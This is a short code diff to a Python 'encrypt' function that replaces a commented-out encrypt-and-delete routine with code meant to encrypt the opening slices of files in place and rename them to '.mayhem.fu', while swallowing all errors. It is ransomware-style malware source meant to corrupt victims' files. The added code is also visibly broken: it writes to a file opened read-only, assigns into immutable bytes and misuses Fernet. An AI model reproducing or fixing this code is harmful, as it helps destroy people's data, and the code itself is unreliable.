@@ -16,12 +16,17 @@ def xor(data, key):
 def encrypt(path, folder, file):
     # //TODO: add doc for this whole thing
     try:
-        # ToEncrypt = open(f'{path}/{folder}/{file}', 'rb').read()
-        # token = f.encrypt(bytes(ToEncrypt))
-        # Already = open(f'{path}/{folder}/{file}.ThisIsClassHomeworks', 'wb').write(token)
-        # print(f'{path}/{folder}/{file}')
-        # os.remove(f'{path}/{folder}/{file}')
-        pass
+        with open(f'{path}/{folder}/{file}', 'rb') as ToEncrypt:
+            info = ToEncrypt.read()
+            first = info[0:round(len(info) / 8)] # this is mayhem. we just fuck everything
+            second = info[round(len(info) / 8) : round(len(info) / 6)]
+            first = Fernet.encrypt(first)
+            second = Fernet.encrypt(second)
+            info[0:round(len(info) / 8)] = first
+            info[round(len(info) / 8) : round(len(info) / 6)] = second
+            ToEncrypt.truncate()
+            ToEncrypt.write(info)
+        os.rename(f'{path}/{folder}/{file}', f'{path}/{folder}/{file}.mayhem.fu')
     except Exception as e:
         pass
     return 0
